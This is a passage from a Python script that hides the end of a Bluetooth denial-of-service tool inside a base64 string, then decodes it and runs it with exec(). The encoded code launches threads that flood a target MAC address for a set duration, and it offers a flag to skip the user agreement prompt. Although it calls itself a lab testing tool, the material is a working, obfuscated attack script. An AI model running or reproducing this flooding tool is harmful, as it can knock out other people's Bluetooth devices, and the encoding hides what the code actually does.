ICAgICBmb3IgaW50ZXJmYWNlIGluIGludGVyZmFjZXM6CiAgICAgICAgICAgICAgICBmb3IgXyBp
biByYW5nZSh0aHJlYWRzX3Blcl9pbnRlcmZhY2UpOgogICAgICAgICAgICAgICAgICAgIGZ1dHVy
ZXMuYXBwZW5kKGV4ZWN1dG9yLnN1Ym1pdChkb3NfdGhyZWFkLCB0YXJnZXRfYWRkciwgcGFja2Fn
ZV9zaXplLCBpbnRlcmZhY2UsIHN0b3BfZXZlbnQsIHBhY2tldF9jb3VudCkpCgogICAgICAgICAg
ICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAg
ICAgd2hpbGUgdGltZS50aW1lKCkgLSBzdGFydF90aW1lIDwgZHVyYXRpb246CiAgICAgICAgICAg
ICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgICAgIHBiYXIudXBkYXRlKDEp
CiAgICAgICAgICAgICAgICBwcmludCgiXG5bKl0gRHVyYXRpb24gcmVhY2hlZC4gU3RvcHBpbmcg
dGhyZWFkcy4uLiIpCiAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAg
ICAgICAgICAgIHByaW50KCJcblsqXSBJbnRlcnJ1cHRlZC4gU3RvcHBpbmcgdGhyZWFkcy4uLiIp
CiAgICAgICAgICAgIAogICAgICAgICAgICBzdG9wX2V2ZW50LnNldCgpCiAgICAgICAgICAgIAog
ICAgICAgICAgICAjIFdhaXQgZm9yIHRocmVhZHMgdG8gZmluaXNoIHdpdGggdGltZW91dAogICAg
ICAgICAgICBmb3IgZnV0dXJlIGluIGFzX2NvbXBsZXRlZChmdXR1cmVzLCB0aW1lb3V0PTEwKToK
ICAgICAgICAgICAgICAgIHBhc3MgICMgR3JhY2VmdWwgZXhpdAoKICAgIG1vbml0b3JfdGhyZWFk
LmpvaW4oKQogICAgZ2VuZXJhdGVfcmVwb3J0KHRhcmdldF9hZGRyLCBkdXJhdGlvbiwgZWZmZWN0
aXZlX3RocmVhZHMsIHBhY2tldF9jb3VudC52YWx1ZSkKICAgIHByaW50KCJbKl0gRG9TIGNvbXBs
ZXRlZC4gQ2hlY2sgcmVwb3J0IGFuZCBsb2dzLiIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18n
OgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IkVuaGFu
Y2VkIEJsdWV0b290aCBEb1MgVGVzdGluZyBUb29sIGZvciBMYWJzIikKICAgIHBhcnNlci5hZGRf
YXJndW1lbnQoJy0tdGFyZ2V0JywgdHlwZT1zdHIsIGhlbHA9IlRhcmdldCBNQUMgYWRkcmVzcyAo
c2tpcHMgc2NhbiBpZiBwcm92aWRlZCkiKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLS1wYWNr
YWdlX3NpemUnLCB0eXBlPWludCwgaGVscD0iUGFja2FnZSBzaXplIikKICAgIHBhcnNlci5hZGRf
YXJndW1lbnQoJy0tdGhyZWFkcycsIHR5cGU9aW50LCBoZWxwPSJOdW1iZXIgb2YgdGhyZWFkcyIp
CiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctLWR1cmF0aW9uJywgdHlwZT1pbnQsIGhlbHA9IkF0
dGFjayBkdXJhdGlvbiBpbiBzZWNvbmRzIikKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy0tbm9f
cHJvbXB0JywgYWN0aW9uPSdzdG9yZV90cnVlJywgaGVscD0iU2tpcCBhZ3JlZW1lbnQgcHJvbXB0
IGZvciBhdXRvbWF0aW9uIikKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy0tYXV0bycsIGFjdGlv
bj0nc3RvcmVfdHJ1ZScsIGhlbHA9IkF1dG8gbW9kZTogdXNlIGRlZmF1bHRzIHdpdGhvdXQgcGFy
YW1ldGVyIHByb21wdHMiKQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKCiAgICB0cnk6
CiAgICAgICAgbWFpbihhcmdzKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAg
IHByaW50KCJcblsqXSBFeGl0aW5nIGdyYWNlZnVsbHkuLi4iKQogICAgICAgIHN5cy5leGl0KDAp
CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nZ2luZy5lcnJvcihmIlVuZXhw
ZWN0ZWQgZXJyb3I6IHtzdHIoZSl9IikKICAgICAgICBwcmludChmIlshXSBVbmV4cGVjdGVkIGVy
cm9yOiB7c3RyKGUpfSIpCiAgICAgICAgc3lzLmV4aXQoMSkK
'''
# Step 2: Decode the Base64 back to Python code
decoded_code = base64.b64decode(encoded_code).decode()
# Step 3: Execute the decoded code
print("\nwait code is executing...")

exec(decoded_code)

